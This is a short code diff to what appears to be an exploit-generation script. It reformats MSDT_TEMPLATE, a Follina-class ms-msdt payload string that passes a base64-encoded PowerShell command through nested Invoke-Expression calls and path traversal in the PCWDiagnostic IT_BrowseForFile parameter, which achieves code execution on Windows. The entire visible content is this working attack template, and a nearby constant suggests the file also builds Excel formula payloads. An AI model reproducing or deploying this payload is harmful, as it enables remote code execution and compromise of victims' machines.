@@ -42,10 +42,11 @@ EXCEL_FORMULA_CHAIN = (
 
 # ── msdt handler (Follina-class) ──
 MSDT_TEMPLATE = (
-    'ms-msdt:/id PCWDiagnostic /skip force /param "IT_BrowseForFile='
-    '$(Invoke-Expression($(Invoke-Expression(\'[System.Text.Encoding]::Unicode'
-    '.GetString([System.Convert]::FromBase64String(\'\''
-    '{b64}\'\'))\')))).Replace(\'XXXXX\',\'/../../../../../../../../'))iis%3a//..."
+    "ms-msdt:/id PCWDiagnostic /skip force /param "
+    "\"IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression("
+    "'[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(''"
+    "{b64}"
+    "''))')))).Replace('XXXXX','/../../../../../../../../'))iis%3a//...\""
 )
 
 
